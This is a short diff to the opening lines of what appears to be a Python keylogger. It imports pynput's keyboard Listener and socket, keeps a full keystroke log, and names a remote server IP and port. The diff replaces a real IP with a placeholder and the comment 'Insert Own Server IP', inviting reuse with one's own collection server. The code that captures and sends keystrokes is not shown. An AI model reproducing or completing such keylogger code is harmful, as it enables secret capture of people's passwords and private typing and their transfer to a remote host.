@@ -1,7 +1,8 @@
 import socket
 from pynput.keyboard import Listener, Key
 
-SERVER_IP = '35.226.246.163'
+#Insert Own Server IP
+SERVER_IP = 'XX.XXX.XXX.XXX'
 SERVER_PORT = 9999
 
 full_input_log = []
